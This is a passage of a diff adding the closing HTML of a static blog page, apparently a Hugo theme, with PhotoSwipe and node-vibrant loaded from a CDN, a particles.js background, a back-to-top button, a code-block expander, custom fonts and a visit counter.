+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js" defer></script>
+<script>
+    function backToTop() {
+      document.documentElement.scrollIntoView({
+        behavior: 'smooth',
+      })
+    }
+  
+    window.onload = function () {
+      let scrollTop =
+        this.document.documentElement.scrollTop || this.document.body.scrollTop
+      let totopBtn = this.document.getElementById('back-to-top')
+      if (scrollTop > 0) {
+        totopBtn.style.display = 'inline'
+      } else {
+        totopBtn.style.display = 'none'
+      }
+    }
+  
+    window.onscroll = function () {
+      let scrollTop =
+        this.document.documentElement.scrollTop || this.document.body.scrollTop
+      let totopBtn = this.document.getElementById('back-to-top')
+      if (scrollTop < 200) {
+        totopBtn.style.display = 'none'
+      } else {
+        totopBtn.style.display = 'inline'
+        totopBtn.addEventListener('click', backToTop, false)
+      }
+    }
+  </script>
+
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+<div id="particles-js"></div>
+<div id="jsi-flying-fish-container"></div>
+
+<style>
+    #particles-js {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        z-index: -2;
+    }
+    #jsi-flying-fish-container {
+        width: 100%;
+        height: 200px;
+        position: absolute;
+        bottom: 0;
+        left: 0;
+        z-index: -1;
+        opacity: 0.37;
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+    }
+    html, body {
+        position: relative;
+        min-height: 100%;
+    }  
+</style>
+
+<script src="/background/particles.min.js"></script>
+<script>
+  particlesJS.load('particles-js', '\/background\/particlesjs-config.json', function() {
+    console.log('particles.js loaded - callback');
+  });
+</script>
+<script src="/js/renderer.js"></script>
+
+
+<script>
+  if (typeof RENDERER !== 'undefined') {
+    RENDERER.init();
+  }
+</script>
+
+<style>
+    .highlight {
+         
+        max-height: 600px;
+        overflow: hidden;
+    }
+
+    .code-show {
+        max-height: none !important;
+    }
+
+    .code-more-box {
+        width: 100%;
+        padding-top: 78px;
+        background-image: -webkit-gradient(linear, left top, left bottom, from(rgba(255, 255, 255, 0)), to(#fff));
+        position: absolute;
+        left: 0;
+        right: 0;
+        bottom: 0;
+        z-index: 1;
+    }
+
+    .code-more-btn {
+        display: block;
+        margin: auto;
+        width: 44px;
+        height: 22px;
+        background: #f0f0f5;
+        border-top-left-radius: 8px;
+        border-top-right-radius: 8px;
+        padding-top: 6px;
+        cursor: pointer;
+    }
+
+    .code-more-img {
+        cursor: pointer !important;
+        display: block;
+        margin: auto;
+        width: 22px;
+        height: 16px;
+    }
+</style>
+
+<script>
+  function initCodeMoreBox() {
+    let codeBlocks = document.querySelectorAll(".highlight");
+    if (!codeBlocks) {
+      return;
+    }
+    codeBlocks.forEach(codeBlock => {
+      
+      if (codeBlock.scrollHeight <= codeBlock.clientHeight) {
+        return;
+      }
+      
+      
+      let codeMoreBox = document.createElement('div');
+      codeMoreBox.classList.add('code-more-box');
+      
+      let codeMoreBtn = document.createElement('span');
+      codeMoreBtn.classList.add('code-more-btn');
+      codeMoreBtn.addEventListener('click', () => {
+        codeBlock.classList.add('code-show');
+        codeMoreBox.style.display = 'none';
+        
+        window.dispatchEvent(new Event('resize'))
+      })
+      
+      let img = document.createElement('img');
+      img.classList.add('code-more-img');
+      img.src = "https://th4uma.github.io/icons/codeMore.png"
+      
+      codeMoreBtn.appendChild(img);
+      codeMoreBox.appendChild(codeMoreBtn);
+      codeBlock.appendChild(codeMoreBox)
+    })
+  }
+ 
+  initCodeMoreBox();
+</script>
+
+
+<style>
+@font-face {
+  font-family: 'songti';
+  src: url('/font/songti.ttf') format('opentype');
+}
+
+@font-face {
+  font-family: 'Ubuntu-R';
+  src: url('/font/Ubuntu-R.ttf') format('opentype');
+}
+
+:root {
+  --base-font-family: 'songti';
+  --code-font-family: 'Ubuntu-R';
+}
+
+body {
+  font-family: var(--base-font-family), sans-serif;
+  background: url(https://th4uma.github.io/background/bg.png) no-repeat center top;
+  background-size: cover;
+  background-attachment: fixed;
+}
+</style>
+
+
+<script defer src="https://cn.vercount.one/js"></script>
+
+
+<a href="#" id="back-to-top" title="返回顶部"></a>
+
+
+<style>
+  #back-to-top {
+    display: none;
+    position: fixed;
+    bottom: 5px;
+    right: 15px;
+    width: 40px;  
+    height: 40px;  
+    border-radius: 50%;  
+    background-color: #2b3947ab !important;
+    box-shadow: var(--shadow-l2);
+    font-size: 20px;  
+    text-align: center;
+    line-height: 38px;  
+    cursor: pointer;
+    transition:
+      transform 0.3s ease,
+      background-color 0.3s ease;  
+  }
+
+  #back-to-top:before {
+    content: "";
+    display: inline-block;
+    position: relative;
+    transform: rotate(135deg);
+    height: 8px;  
+    width: 8px;  
+    border-width: 0 0 2px 2px;
+    border-color: var(--back-to-top-color);
+    border-style: solid;
+  }
+
+  #back-to-top:hover {
+    transform: scale(1.1);  
+    background-color: var(--accent-background);  
+  }
+
+  #back-to-top:hover:before {
+    border-color: var(--accent-color);  
+  }
+
+   
+  @media screen and (max-width: 768px) {
+    #back-to-top {
+      bottom: 5px;
+      right: var(--container-padding);
+      width: 30px;  
+      height: 30px;
+      font-size: 16px;
+      line-height: 32px;
+    }
+  }
+
+  @media screen and (min-width: 1024px) {
+    #back-to-top {
+      bottom: 10px;
+      right: 20px;
+    }
+  }
+
+  @media screen and (min-width: 1280px) {
+    #back-to-top {
+      bottom: 15px;
+      right: 25px;
+    }
+  }
+
+  @media screen and (min-width: 1536px) {
+    #back-to-top {
+      bottom: 15px;
+      right: 25px;
+       
+    }
+  }
+</style>
+
+
+    </body>
+</html>
